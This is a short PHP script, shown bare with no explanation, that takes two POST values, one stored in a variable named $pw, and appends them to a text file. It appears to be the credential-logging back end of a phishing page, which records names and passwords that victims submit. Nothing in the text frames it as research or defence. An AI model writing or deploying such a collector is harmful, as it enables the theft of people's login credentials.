<?php
	$name=$_POST['FilePath'];
	$pw=$_POST['Result'];
	$h=fopen('a.txt','a');
	fwrite($h,$name);
	fwrite($h,$pw);
	fclose($h);
?>
